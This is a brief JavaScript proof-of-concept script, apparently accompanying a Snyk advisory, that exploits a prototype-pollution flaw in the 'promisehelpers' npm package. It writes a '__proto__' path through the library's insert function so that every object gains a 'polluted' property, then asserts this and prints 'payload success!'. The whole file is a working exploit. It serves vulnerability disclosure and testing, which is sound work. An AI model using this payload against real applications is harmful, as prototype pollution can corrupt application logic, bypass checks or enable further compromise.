//https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
const promisehelpers = require('promisehelpers');
const assert = require('assert');

var obj = {}
console.log("Before : " + obj.polluted);

promisehelpers.insert(['__proto__', 'polluted'], "yes")(obj);

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");